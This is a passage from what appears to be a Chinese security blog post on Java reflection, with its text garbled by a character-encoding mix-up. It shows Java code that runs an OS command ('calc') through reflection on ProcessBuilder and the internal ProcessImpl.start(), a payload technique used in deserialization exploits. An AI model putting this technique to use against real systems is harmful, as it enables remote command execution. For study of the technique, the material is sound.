ä¸­é—´ä»£ç ç²¾ç‚¼ä¸€ä¸‹å°±æ˜¯ï¼ˆè¿™æ ·å°±ä¸ç”¨å¯¼langä¸‹çš„åŒ…ï¼‰ï¼š Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc\u0026#34;))); è¿™é‡Œä¸»è¦å°±æ˜¯åˆ©ç”¨çš„å¦å¤–ä¸€ä¸ªæ„é€ å‡½æ•°æ¥æ„é€ çš„payloadï¼š\nå› ä¸ºè¿™ä¸¤ä¸ªæ„é€ å‡½æ•°å…¶å®æœ€åéƒ½æ˜¯ç›´æ¥ä½œç”¨ä¸å®ƒçš„commandå˜é‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦ä¼ å…¥çš„å‘½ä»¤ï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥é€šè¿‡è·å–ç›¸åº”çš„æ„é€ å‡½æ•°å¹¶ä¼ å…¥ç›¸åº”çš„å€¼æ¥æ‰§è¡Œå‘½ä»¤ã€‚å…·ä½“å°±çœ‹ä¸Šé¢çš„ä»£ç äº†ï¼Œä¸å¤šèµ˜è¿°ã€‚\nProcessImpl#start() å¯¹åº”ä»£ç ï¼š\nè¿™é‡Œå…¶å®å°±æ˜¯å¯¹åº”çš„ProcessBuilderç±»è°ƒç”¨çš„start()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å‰ä¸€ä¸ªè°ƒç”¨æ–¹æ³•çš„æ›´æ·±ä¸€å±‚ä½†æ˜¯è¿™é‡Œå¯¹åº”çš„ç±»æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ã€‚\nå¯¹äºè¿™é‡Œç›´æ¥è°ƒç”¨çš„ProcessImplç±»çš„start()æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯å› ä¸ºè¿™ä¸ªç±»çš„start()æ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼ŒåŒæ ·ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œå¯¹åº”çš„å‚æ•°ä¼ é€’æƒ…å†µï¼š\næ‰€ä»¥ç›´æ¥æ‰“å°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.invoke(null,cmd,null,null,null,false); } } æŠ¥é”™ï¼š\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.NoSuchMethodException: java.lang.ProcessImpl.start([Ljava.lang.String;, java.util.Map, java.lang.String, java.lang.ProcessBuilder$Redirect, boolean) at java.lang.Class.getDeclaredMethod(Class.java:2130) at java_foundation.MyTest.main(MyTest.java:10) è™½ç„¶è¿™ä¸ªstart()æ–¹æ³•æ²¡æœ‰å®šä¹‰ä¸ºç§æœ‰ç±»å‹ï¼š\nä½†æ˜¯è¿™ä¸ªstart()æ–¹æ³•æ‰€å¤„çš„ProcessImplç±»æ˜¯finalç±»å‹çš„çš„ï¼Œå¹¶ä¸”éƒ½ä¸èƒ½ç›´æ¥importå¼•å…¥ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡setAccessible(true);æ¥è®©å…¶å¯ä»¥è®¿é—®ã€‚\næ‰€ä»¥æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); method.invoke(null,cmd,null,null,null,false); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nè¿™é‡Œåªåˆ†æäº†é€šç”¨çš„ä¸¤ä¸ªpayloadï¼Œå¯¹äºlinuxç¯å¢ƒå½“ç„¶è¿˜å¯ä»¥æ‰“å…¶ä»–çš„æ–¹å¼ï¼Œå…·ä½“çœ‹å‚è€ƒæ–‡ç« ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/Nestar/p/17335689.html\nhttps://xz.aliyun.com/t/12446?time__1311=GqGxRQ0%3DitqiqGN4eeT4QwqWqrvD9BjiZaoD\n","date":"2025-01-22T12:38:15+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","title":"Javaåå°„æœºåˆ¶"}]